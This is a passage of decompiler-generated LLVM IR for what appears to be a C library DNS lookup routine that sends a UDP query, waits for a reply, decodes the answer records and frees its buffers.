dec_label_pc_100125d4:                            ; preds = %dec_label_pc_100125b4
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_100125dc

dec_label_pc_100125dcthread-pre-split:            ; preds = %dec_label_pc_100125b4
  %v3_100125dc.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_100125dc

dec_label_pc_100125dc:                            ; preds = %dec_label_pc_100125dcthread-pre-split, %dec_label_pc_100125d4
  %v3_100125dc = phi i16 [ %v3_100125dc.pr, %dec_label_pc_100125dcthread-pre-split ], [ 10, %dec_label_pc_100125d4 ]
  %v3_100125e0 = icmp eq i16 %v3_100125dc, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_100125e0, label %dec_label_pc_10012608, label %dec_label_pc_100125f4

dec_label_pc_100125f4:                            ; preds = %dec_label_pc_100125dc
  %v0_100125f8 = load i32, i32* @r29, align 4
  store i32 268510724, i32* @lr, align 4
  %v1_10012600 = call i32 @inet_addr(i32 %v0_100125f8)
  %v3_10012608.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10012608

dec_label_pc_10012608:                            ; preds = %dec_label_pc_100125dc, %dec_label_pc_100125f4
  %v3_10012608 = phi i16 [ 10, %dec_label_pc_100125dc ], [ %v3_10012608.pre, %dec_label_pc_100125f4 ]
  %v4_10012608 = sext i16 %v3_10012608 to i32
  store i32 268510744, i32* @lr, align 4
  %v3_10012614 = call i32 @socket(i32 %v4_10012608, i32 2, i32 17)
  store i32 %v3_10012614, i32* @r19, align 4
  %v1_10012618 = icmp slt i32 %v3_10012614, 0
  br i1 %v1_10012618, label %dec_label_pc_10012644, label %dec_label_pc_10012620

dec_label_pc_10012620:                            ; preds = %dec_label_pc_10012608
  store i32 268510764, i32* @lr, align 4
  %v3_10012628 = call i32 @__libc_connect(i32 %v2_10012620, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_10012628, -1
  br i1 %tmp60, label %dec_label_pc_1001264c, label %dec_label_pc_10012634

dec_label_pc_10012634:                            ; preds = %dec_label_pc_10012620
  %v0_10012634 = call i32 @__errno_location()
  %v1_10012638 = inttoptr i32 %v0_10012634 to i32*
  %v2_10012638 = load i32, i32* %v1_10012638, align 4
  store i32 %v2_10012638, i32* %r0.global-to-local, align 4
  %v3_1001263c = icmp eq i32 %v2_10012638, 101
  br i1 %v3_1001263c, label %dec_label_pc_10012984, label %dec_label_pc_10012644

dec_label_pc_10012644:                            ; preds = %dec_label_pc_10012634, %dec_label_pc_10012608
  %v0_10012644 = load i32, i32* %r18.global-to-local, align 4
  %v1_10012644 = add i32 %v0_10012644, 1
  store i32 %v1_10012644, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_10012644, 3
  br i1 %tmp61, label %dec_label_pc_10012494, label %dec_label_pc_100129b8

dec_label_pc_1001264c:                            ; preds = %dec_label_pc_10012620
  %v0_1001264c = load i32, i32* @r28, align 4
  %v1_1001264c = load i32, i32* @r27, align 4
  %v2_1001264c = add i32 %v1_1001264c, %v0_1001264c
  %v0_10012650 = load i32, i32* @r30, align 4
  %v0_10012658 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10012660.686 to i32), i32* @lr, align 4
  %v4_1001265c = call i32 @__libc_send(i32 %v0_10012658, i32 %v0_10012650, i32 %v2_1001264c, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10012674 = load i32, i32* @r19, align 4
  store i32 %v0_10012674, i32* %stack_var_-248, align 4
  store i32 268510844, i32* @lr, align 4
  %v3_10012678 = call i32 @__libc_poll(i32 %v2_10012664, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10012678, 1
  br i1 %tmp62, label %dec_label_pc_10012984, label %dec_label_pc_10012684

dec_label_pc_10012684:                            ; preds = %dec_label_pc_1001264c
  %v0_10012684 = load i32, i32* @r19, align 4
  %v0_10012688 = load i32, i32* @r30, align 4
  store i32 268510872, i32* @lr, align 4
  %v4_10012694 = call i32 @__libc_recv(i32 %v0_10012684, i32 %v0_10012688, i32 512, i32 0)
  store i32 %v4_10012694, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10012694, 12
  br i1 %tmp63, label %dec_label_pc_1001292c, label %dec_label_pc_100126a4

dec_label_pc_100126a4:                            ; preds = %dec_label_pc_10012684
  %v0_100126a4 = load i32, i32* @r30, align 4
  %v2_100126ac = inttoptr i32 %v0_100126a4 to i8*
  %v3_100126ac = call i32 @__decode_header(i8* %v2_100126ac, i32 %v2_100124ac)
  %v3_100126b0 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_100126b0, i32* @r20, align 4
  %v1_100126b4 = load i32, i32* @r25, align 4
  %v4_100126b4 = icmp eq i32 %v3_100126b0, %v1_100126b4
  br i1 %v4_100126b4, label %dec_label_pc_100126bc, label %dec_label_pc_1001292c

dec_label_pc_100126bc:                            ; preds = %dec_label_pc_100126a4
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_100126c0, label %dec_label_pc_1001292c, label %dec_label_pc_100126c8

dec_label_pc_100126c8:                            ; preds = %dec_label_pc_100126bc
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_100126cc, label %dec_label_pc_100126d4, label %dec_label_pc_1001273c

dec_label_pc_100126d4:                            ; preds = %dec_label_pc_100126c8
  %v0_100126d4 = load i32, i32* %r17.global-to-local, align 4
  %v3_100126d4 = icmp eq i32 %v0_100126d4, 0
  br i1 %v3_100126d4, label %dec_label_pc_100126dc, label %dec_label_pc_10012730

dec_label_pc_100126dc:                            ; preds = %dec_label_pc_100126d4
  store i32 ptrtoint (i32* @global_var_10028538.626 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012438, i32* %r28.global-to-local, align 4
  store i32 %v2_10012438, i32* @r3, align 4
  %v0_100126f8 = call i32 @__pthread_return_void()
  %v0_10012700 = call i32 @__pthread_return_0()
  %v3_10012708 = load i32, i32* @global_var_10028620.681, align 4
  store i32 %v2_10012438, i32* @r3, align 4
  %v1_10012714 = add i32 %v3_10012708, -1
  store i32 %v1_10012714, i32* %r29.global-to-local, align 4
  %v0_10012718 = call i32 @__pthread_return_void()
  %v0_1001271c = load i32, i32* @r22, align 4
  %v2_1001271c = icmp slt i32 %v0_1001271c, %v1_10012714
  br i1 %v2_1001271c, label %dec_label_pc_10012724, label %dec_label_pc_10012730

dec_label_pc_10012724:                            ; preds = %dec_label_pc_100126dc
  %v1_10012724 = add i32 %v0_1001271c, 1
  store i32 %v1_10012724, i32* @r22, align 4
  %v0_10012728 = load i32, i32* @r20, align 4
  store i32 %v0_10012728, i32* @r25, align 4
  br label %dec_label_pc_100129a0thread-pre-split.backedge

dec_label_pc_10012730:                            ; preds = %dec_label_pc_100126dc, %dec_label_pc_100126d4
  %v0_10012730 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10012764

dec_label_pc_1001273c:                            ; preds = %dec_label_pc_100126c8
  br i1 %v3_1001273c, label %dec_label_pc_10012744, label %dec_label_pc_1001292c

dec_label_pc_10012744:                            ; preds = %dec_label_pc_1001273c
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1001275c, label %dec_label_pc_10012750

dec_label_pc_10012750:                            ; preds = %dec_label_pc_10012744
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1001277c10 = load i32, i32* @r30, align 4
  store i32 %v0_1001277c10, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001276c

dec_label_pc_1001275c:                            ; preds = %dec_label_pc_10012744
  %v0_1001275c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10012764

dec_label_pc_10012764:                            ; preds = %dec_label_pc_10012730, %dec_label_pc_1001275c
  %storemerge3 = phi i32 [ %v0_1001275c, %dec_label_pc_1001275c ], [ %v0_10012730, %dec_label_pc_10012730 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1001275c ], [ 1, %dec_label_pc_10012730 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10012764 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10012764, align 4
  br label %dec_label_pc_100129c8

dec_label_pc_1001276c:                            ; preds = %dec_label_pc_10012750, %dec_label_pc_1001276c
  %v0_1001277c14 = phi i32 [ %v0_1001277c10, %dec_label_pc_10012750 ], [ %v0_1001277c, %dec_label_pc_1001276c ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10012750 ], [ %v2_10012770, %dec_label_pc_1001276c ]
  store i32 268511088, i32* @lr, align 4
  %v2_1001276c = call i32 @__length_question(i32 %v0_1001277c14, i32 %storemerge213)
  %v0_10012770 = load i32, i32* %r28.global-to-local, align 4
  %v2_10012770 = add i32 %v0_10012770, %v2_1001276c
  %v0_10012780.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10012770, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10012770, i32* @r4, align 4
  %v0_1001277c = load i32, i32* @r30, align 4
  store i32 %v0_1001277c, i32* @r3, align 4
  %v2_10012780 = icmp slt i32 %v0_10012780.pr, 1
  %v1_10012784 = add i32 %v0_10012780.pr, 1
  store i32 %v1_10012784, i32* %r29.global-to-local, align 4
  br i1 %v2_10012780, label %dec_label_pc_1001276c, label %dec_label_pc_1001278c

dec_label_pc_1001278c:                            ; preds = %dec_label_pc_1001276c
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_10012748, label %dec_label_pc_100128d8, label %dec_label_pc_100128e0

dec_label_pc_1001279c:                            ; preds = %dec_label_pc_100128d8
  store i32 %v2_1001279c, i32* %r29.global-to-local, align 4
  %v0_100127a0 = load i32, i32* @r30, align 4
  store i32 268511156, i32* @lr, align 4
  %v5_100127b0 = call i32 @__decode_answer(i32 %v0_100127a0, i32 %v0_100127a4, i32 %v1_100128d8, i32* nonnull %stack_var_-184)
  store i32 %v5_100127b0, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_100127b0, -1
  br i1 %tmp64, label %dec_label_pc_100127d4, label %dec_label_pc_100127bc

dec_label_pc_100127bc:                            ; preds = %dec_label_pc_1001279c
  %v0_100127bc = load i32, i32* @r24, align 4
  %v3_100127bc = icmp eq i32 %v0_100127bc, 0
  br i1 %v3_100127bc, label %dec_label_pc_1001292c, label %dec_label_pc_100127c4

dec_label_pc_100127c4:                            ; preds = %dec_label_pc_100127bc
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_100127c8, label %dec_label_pc_1001292c, label %dec_label_pc_100128e0

dec_label_pc_100127d4:                            ; preds = %dec_label_pc_1001279c
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_100127d8 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_100127d8, label %dec_label_pc_1001287c, label %dec_label_pc_100127e0

dec_label_pc_100127e0:                            ; preds = %dec_label_pc_100127d4
  %v0_100127e0 = load i32, i32* @r31, align 4
  store i32 %v2_1001279c, i32* @r4, align 4
  %v1_100127e8 = add i32 %v0_100127e0, 28
  %v2_100127e8 = inttoptr i32 %v1_100127e8 to i32*
  %v3_100127e8 = load i32, i32* %v2_100127e8, align 4
  store i32 %v3_100127e8, i32* %r0.global-to-local, align 4
  store i32 %v0_100127e0, i32* @r3, align 4
  %v1_100127f0 = add i32 %v0_100127e0, 36
  %v2_100127f0 = inttoptr i32 %v1_100127f0 to i32*
  %v3_100127f0 = load i32, i32* %v2_100127f0, align 4
  store i32 %v3_100127f0, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268511240, i32* @lr, align 4
  %v0_10012804 = call i32 @memcpy()
  %v0_10012808 = load i32, i32* @r31, align 4
  %v1_10012808 = add i32 %v0_10012808, 4
  %v2_10012808 = inttoptr i32 %v1_10012808 to i32*
  %v3_10012808 = load i32, i32* %v2_10012808, align 4
  %v3_1001280c = icmp eq i32 %v3_10012808, 24
  br i1 %v3_1001280c, label %dec_label_pc_100127e0.dec_label_pc_10012830_crit_edge, label %dec_label_pc_10012814

dec_label_pc_100127e0.dec_label_pc_10012830_crit_edge: ; preds = %dec_label_pc_100127e0
  %v1_10012830.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10012830

dec_label_pc_10012814:                            ; preds = %dec_label_pc_100127e0
  %v1_10012814 = add i32 %v0_10012808, 28
  %v2_10012814 = inttoptr i32 %v1_10012814 to i32*
  %v3_10012814 = load i32, i32* %v2_10012814, align 4
  store i32 %v3_10012814, i32* %r0.global-to-local, align 4
  %v3_10012818 = icmp eq i32 %v3_10012814, 0
  br i1 %v3_10012818, label %dec_label_pc_100128e0, label %dec_label_pc_10012820

dec_label_pc_10012820:                            ; preds = %dec_label_pc_10012814
  %v0_10012820 = load i32, i32* %r16.global-to-local, align 4
  %v3_10012820 = icmp eq i32 %v0_10012820, 1
  br i1 %v3_10012820, label %dec_label_pc_10012830, label %dec_label_pc_10012828

dec_label_pc_10012828:                            ; preds = %dec_label_pc_10012820
  %v3_10012828 = icmp eq i32 %v0_10012820, 28
  br i1 %v3_10012828, label %dec_label_pc_10012830, label %dec_label_pc_100128e0

dec_label_pc_10012830:                            ; preds = %dec_label_pc_100127e0.dec_label_pc_10012830_crit_edge, %dec_label_pc_10012828, %dec_label_pc_10012820
  %v1_10012830 = phi i32 [ %v1_10012830.pre, %dec_label_pc_100127e0.dec_label_pc_10012830_crit_edge ], [ 28, %dec_label_pc_10012828 ], [ 1, %dec_label_pc_10012820 ]
  %v4_10012830 = icmp eq i32 %v3_10012808, %v1_10012830
  br i1 %v4_10012830, label %dec_label_pc_10012844, label %dec_label_pc_10012838

dec_label_pc_10012838:                            ; preds = %dec_label_pc_10012830
  %v1_10012838 = inttoptr i32 %v0_10012808 to i32*
  %v2_10012838 = load i32, i32* %v1_10012838, align 4
  store i32 %v2_10012838, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10012840.689 to i32), i32* @lr, align 4
  %v0_1001283c = call i32 @free()
  br label %dec_label_pc_100128c4

dec_label_pc_10012844:                            ; preds = %dec_label_pc_10012830
  %v1_10012848 = add i32 %v0_10012808, 16
  %v2_10012848 = inttoptr i32 %v1_10012848 to i32*
  %v3_10012848 = load i32, i32* %v2_10012848, align 4
  store i32 %v3_10012848, i32* %r11.global-to-local, align 4
  %v0_1001284c = load i32, i32* @r24, align 4
  %v2_1001284c = sub i32 %tmp35, %v0_1001284c
  %v1_10012850 = add i32 %v0_10012808, 32
  %v2_10012850 = inttoptr i32 %v1_10012850 to i32*
  %v3_10012850 = load i32, i32* %v2_10012850, align 4
  store i32 %v3_10012850, i32* %r0.global-to-local, align 4
  %v1_10012854 = add i32 %v2_1001284c, -1
  %v1_10012858 = add i32 %v3_10012848, 4
  %v2_1001285c = mul i32 %v1_10012854, %v1_10012858
  store i32 %v2_1001285c, i32* %r11.global-to-local, align 4
  %v2_10012860 = add i32 %v0_10012808, 36
  %v3_10012860 = inttoptr i32 %v2_10012860 to i32*
  store i32 %v1_10012854, i32* %v3_10012860, align 4
  %v0_10012864 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012864 = load i32, i32* %r0.global-to-local, align 4
  %v3_10012864 = icmp ugt i32 %v0_10012864, %v1_10012864
  br i1 %v3_10012864, label %dec_label_pc_100128e0, label %dec_label_pc_1001286c

dec_label_pc_1001286c:                            ; preds = %dec_label_pc_10012844
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10012874 = load i32, i32* @r31, align 4
  %v2_10012874 = add i32 %v1_10012874, 36
  %v3_10012874 = inttoptr i32 %v2_10012874 to i32*
  store i32 0, i32* %v3_10012874, align 4
  br label %dec_label_pc_100128c4

dec_label_pc_1001287c:                            ; preds = %dec_label_pc_100127d4
  %v3_1001287c = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1001287c, i32* @r3, align 4
  store i32 268511364, i32* @lr, align 4
  %v0_10012880 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10012888 = load i32, i32* %r16.global-to-local, align 4
  %v4_10012888 = icmp eq i32 %tmp29, %v1_10012888
  br i1 %v4_10012888, label %dec_label_pc_10012890, label %dec_label_pc_100128c4

dec_label_pc_10012890:                            ; preds = %dec_label_pc_1001287c
  %v0_10012890 = load i32, i32* @r31, align 4
  %v1_10012890 = add i32 %v0_10012890, 16
  %v2_10012890 = inttoptr i32 %v1_10012890 to i32*
  %v3_10012890 = load i32, i32* %v2_10012890, align 4
  store i32 %v3_10012890, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10012898 = icmp eq i32 %v3_10012890, %tmp28
  br i1 %v4_10012898, label %dec_label_pc_100128a0, label %dec_label_pc_10012924

dec_label_pc_100128a0:                            ; preds = %dec_label_pc_10012890
  %v1_100128a0 = add i32 %v0_10012890, 36
  %v2_100128a0 = inttoptr i32 %v1_100128a0 to i32*
  %v3_100128a0 = load i32, i32* %v2_100128a0, align 4
  %v1_100128a4 = add i32 %v0_10012890, 28
  %v2_100128a4 = inttoptr i32 %v1_100128a4 to i32*
  %v3_100128a4 = load i32, i32* %v2_100128a4, align 4
  store i32 %v3_100128a4, i32* %r0.global-to-local, align 4
  %v2_100128a8 = mul i32 %v3_100128a0, %tmp28
  %v2_100128b0 = add i32 %v3_100128a4, %v2_100128a8
  store i32 %v2_100128b0, i32* @r3, align 4
  store i32 268511416, i32* @lr, align 4
  %v0_100128b4 = call i32 @memcpy()
  %v0_100128b8 = load i32, i32* @r31, align 4
  %v1_100128b8 = add i32 %v0_100128b8, 36
  %v2_100128b8 = inttoptr i32 %v1_100128b8 to i32*
  %v3_100128b8 = load i32, i32* %v2_100128b8, align 4
  %v1_100128bc = add i32 %v3_100128b8, 1
  store i32 %v1_100128bc, i32* %v2_100128b8, align 4
  br label %dec_label_pc_100128c4

dec_label_pc_100128c4:                            ; preds = %dec_label_pc_1001287c, %dec_label_pc_1001286c, %dec_label_pc_10012838, %dec_label_pc_100128a0
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_100128a0 ], [ 0, %dec_label_pc_1001287c ], [ 0, %dec_label_pc_1001286c ], [ %stack_var_-88.118, %dec_label_pc_10012838 ]
  %v0_100128c4 = load i32, i32* @r28, align 4
  %v1_100128c4 = load i32, i32* %r15.global-to-local, align 4
  %v2_100128c4 = add i32 %v1_100128c4, %v0_100128c4
  store i32 %v2_100128c4, i32* %r28.global-to-local, align 4
  %v0_100128c8 = load i32, i32* @r24, align 4
  %v1_100128c8 = add i32 %v0_100128c8, 1
  store i32 %v1_100128c8, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_100128d0 = icmp slt i32 %v1_100128c8, %tmp35
  br i1 %v2_100128d0, label %dec_label_pc_100128d8, label %dec_label_pc_100128e0

dec_label_pc_100128d8:                            ; preds = %dec_label_pc_1001278c, %dec_label_pc_100128c4
  %v0_100127a4 = phi i32 [ %v2_100128c4, %dec_label_pc_100128c4 ], [ %v2_10012770, %dec_label_pc_1001278c ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_100128c4 ], [ 1, %dec_label_pc_1001278c ]
  %v1_100128d8 = load i32, i32* @r27, align 4
  %v2_100128d8 = icmp slt i32 %v0_100127a4, %v1_100128d8
  br i1 %v2_100128d8, label %dec_label_pc_1001279c, label %dec_label_pc_100128e0

dec_label_pc_100128e0:                            ; preds = %dec_label_pc_100127c4, %dec_label_pc_1001278c, %dec_label_pc_100128d8, %dec_label_pc_10012814, %dec_label_pc_10012844, %dec_label_pc_100128c4, %dec_label_pc_10012828
  %v0_100128e0 = load i32, i32* @r19, align 4
  store i32 268511464, i32* @lr, align 4
  %v1_100128e4 = call i32 @__libc_close(i32 %v0_100128e0)
  %v3_100128ec = icmp eq i32 %arg5, 0
  %v0_100128fc = load i32, i32* @r30, align 4
  br i1 %v3_100128ec, label %dec_label_pc_100128fc, label %dec_label_pc_100128f4

dec_label_pc_100128f4:                            ; preds = %dec_label_pc_100128e0
  %v2_100128f4 = inttoptr i32 %arg5 to i32*
  store i32 %v0_100128fc, i32* %v2_100128f4, align 4
  br label %dec_label_pc_10012904

dec_label_pc_100128fc:                            ; preds = %dec_label_pc_100128e0
  store i32 %v0_100128fc, i32* @r3, align 4
  store i32 268511492, i32* @lr, align 4
  %v0_10012900 = call i32 @free()
  br label %dec_label_pc_10012904

dec_label_pc_10012904:                            ; preds = %dec_label_pc_100128f4, %dec_label_pc_100128fc
  %v0_10012904 = load i32, i32* @r21, align 4
  store i32 %v0_10012904, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 268511504, i32* @lr, align 4
  %v0_1001290c = call i32 @free()
  store i32 ptrtoint (i32* @global_var_1002e858.677 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10012a08

dec_label_pc_10012924:                            ; preds = %dec_label_pc_10012890
  %v1_10012924 = inttoptr i32 %v0_10012890 to i32*
  %v2_10012924 = load i32, i32* %v1_10012924, align 4
  store i32 %v2_10012924, i32* @r3, align 4
  store i32 268511532, i32* @lr, align 4
  %v0_10012928 = call i32 @free()
  br label %dec_label_pc_1001292c

dec_label_pc_1001292c:                            ; preds = %dec_label_pc_1001273c, %dec_label_pc_100126a4, %dec_label_pc_100127c4, %dec_label_pc_100127bc, %dec_label_pc_100126bc, %dec_label_pc_10012684, %dec_label_pc_10012924
  %v0_1001292c = load i32, i32* %r17.global-to-local, align 4
  %v3_1001292c = icmp eq i32 %v0_1001292c, 0
  br i1 %v3_1001292c, label %dec_label_pc_10012934, label %dec_label_pc_10012984

dec_label_pc_10012934:                            ; preds = %dec_label_pc_1001292c
  store i32 ptrtoint (i32* @global_var_10028538.626 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012438, i32* %r28.global-to-local, align 4
  store i32 %v2_10012438, i32* @r3, align 4
  %v0_10012950 = call i32 @__pthread_return_void()
  %v0_10012958 = call i32 @__pthread_return_0()
  %v3_10012960 = load i32, i32* @global_var_10028620.681, align 4
  store i32 %v2_10012438, i32* @r3, align 4
  %v1_1001296c = add i32 %v3_10012960, -1
  store i32 %v1_1001296c, i32* %r29.global-to-local, align 4
  %v0_10012970 = call i32 @__pthread_return_void()
  %v0_10012974 = load i32, i32* @r22, align 4
  %v2_10012974 = icmp slt i32 %v0_10012974, %v1_1001296c
  br i1 %v2_10012974, label %dec_label_pc_1001297c, label %dec_label_pc_10012984

dec_label_pc_1001297c:                            ; preds = %dec_label_pc_10012934
  %v1_1001297c = add i32 %v0_10012974, 1
  store i32 %v1_1001297c, i32* @r22, align 4
  br label %dec_label_pc_100129a0thread-pre-split.backedge

dec_label_pc_100129a0thread-pre-split.backedge:   ; preds = %dec_label_pc_1001297c, %dec_label_pc_10012724, %dec_label_pc_1001299c
  %v0_100129a0.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_100129a0.pr, 3
  br i1 %tmp65, label %dec_label_pc_10012494.lr.ph, label %dec_label_pc_100129b8

dec_label_pc_10012984:                            ; preds = %dec_label_pc_10012634, %dec_label_pc_10012934, %dec_label_pc_1001292c, %dec_label_pc_1001264c
  %v0_10012984 = load i32, i32* @r26, align 4
  %v1_10012984 = add i32 %v0_10012984, 1
  store i32 %v1_10012984, i32* %r0.global-to-local, align 4
  %v1_10012988 = load i32, i32* @r23, align 4
  %v2_10012988 = srem i32 %v1_10012984, %v1_10012988
  store i32 %v2_10012988, i32* @r26, align 4
  %v5_10012990 = icmp eq i32 %v2_10012988, 0
  br i1 %v5_10012990, label %dec_label_pc_10012998, label %dec_label_pc_1001299c

dec_label_pc_10012998:                            ; preds = %dec_label_pc_10012984
  %v0_10012998 = load i32, i32* %r18.global-to-local, align 4
  %v1_10012998 = add i32 %v0_10012998, 1
  store i32 %v1_10012998, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1001299c

dec_label_pc_1001299c:                            ; preds = %dec_label_pc_10012984, %dec_label_pc_10012998
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_100129a0thread-pre-split.backedge

dec_label_pc_10012494.lr.ph:                      ; preds = %dec_label_pc_10012494.lr.ph.lr.ph, %dec_label_pc_100129a0thread-pre-split.backedge
  br label %dec_label_pc_10012494

dec_label_pc_100129ac:                            ; preds = %dec_label_pc_1001240c, %dec_label_pc_10012404, %dec_label_pc_100123fc, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_100129b8

dec_label_pc_100129b8:                            ; preds = %dec_label_pc_100129a0thread-pre-split.backedge, %dec_label_pc_100124a4, %dec_label_pc_10012580, %dec_label_pc_10012644, %dec_label_pc_10012418, %dec_label_pc_100129ac
  %v0_100129b8 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_100129c0 = inttoptr i32 %v0_100129b8 to i32*
  store i32 -1, i32* %v2_100129c0, align 4
  %v0_100129c4 = load i32, i32* @r25, align 4
  store i32 %v0_100129c4, i32* @r20, align 4
  br label %dec_label_pc_100129c8

dec_label_pc_100129c8:                            ; preds = %dec_label_pc_10012764, %dec_label_pc_100129b8
  %v0_100129c8 = load i32, i32* @r19, align 4
  %v3_100129c8 = icmp eq i32 %v0_100129c8, -1
  br i1 %v3_100129c8, label %dec_label_pc_100129d8, label %dec_label_pc_100129d0

dec_label_pc_100129d0:                            ; preds = %dec_label_pc_100129c8
  store i32 268511704, i32* @lr, align 4
  %v1_100129d4 = call i32 @__libc_close(i32 %v0_100129c8)
  br label %dec_label_pc_100129d8

dec_label_pc_100129d8:                            ; preds = %dec_label_pc_100129c8, %dec_label_pc_100129d0
  %v0_100129d8 = load i32, i32* @r21, align 4
  store i32 %v0_100129d8, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268511716, i32* @lr, align 4
  %v0_100129e0 = call i32 @free()
  %v0_100129e4 = load i32, i32* @r30, align 4
  store i32 %v0_100129e4, i32* @r3, align 4
  store i32 268511724, i32* @lr, align 4
  %v0_100129e8 = call i32 @free()
  %v0_100129ec = load i32, i32* @r26, align 4
  %v3_100129ec = icmp eq i32 %v0_100129ec, -1
  br i1 %v3_100129ec, label %dec_label_pc_10012a38, label %dec_label_pc_100129f4

dec_label_pc_100129f4:                            ; preds = %dec_label_pc_100129d8
  store i32 ptrtoint (i32* @global_var_1002e858.677 to i32), i32* %r29.global-to-local, align 4
  %v2_10012a00 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10012a08

dec_label_pc_10012a08:                            ; preds = %dec_label_pc_10012904, %dec_label_pc_100129f4
  %storemerge68 = phi i32 [ %v2_10012a00, %dec_label_pc_100129f4 ], [ %v2_10012438, %dec_label_pc_10012904 ]
  %v1_10012a0c.pre-phi = phi i32 [ %v2_10012a00, %dec_label_pc_100129f4 ], [ %v2_10012438, %dec_label_pc_10012904 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_10012a0c.pre-phi, i32* @r3, align 4
  %v0_10012a10 = call i32 @__pthread_return_void()
  %v0_10012a18 = call i32 @__pthread_return_0()
  %v0_10012a20 = load i32, i32* @r26, align 4
  store i32 %v0_10012a20, i32* @global_var_10028618.678, align 4
  store i32 %v1_10012a0c.pre-phi, i32* @r3, align 4
  %v0_10012a30 = load i32, i32* @r20, align 4
  %v1_10012a30 = trunc i32 %v0_10012a30 to i16
  store i16 %v1_10012a30, i16* @global_var_10028534.679, align 2
  %v0_10012a34 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10012a38

dec_label_pc_10012a38:                            ; preds = %dec_label_pc_100129d8, %dec_label_pc_10012a08
  store i32 %v0_100123b8, i32* %r0.global-to-local, align 4
  %v0_10012a3c = load i32, i32* @r27, align 4
  ret i32 %v0_10012a3c

; uselistorder directives
  uselistorder i32 %v1_10012a0c.pre-phi, { 1, 0 }
  uselistorder i32 %v2_10012988, { 1, 0 }
  uselistorder i32 %v0_100128fc, { 1, 0 }
  uselistorder i32 %v1_100128d8, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_100127a4, { 1, 0 }
  uselistorder i32 %v1_100128c8, { 1, 0 }
  uselistorder i32 %v0_10012890, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10012854, { 1, 0 }
  uselistorder i32 %v0_100127e0, { 2, 1, 0 }
  uselistorder i32 %v0_1001277c, { 1, 0 }
  uselistorder i32 %v2_10012770, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10012694, { 1, 0 }
  uselistorder i32 %v1_10012594, { 1, 0 }
  uselistorder i32 %v1_10012568, { 1, 0 }
  uselistorder i32 %v1_10012534, { 1, 0 }
  uselistorder i32 %v1_100124cc, { 1, 0 }
  uselistorder i32 %v2_10012438, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
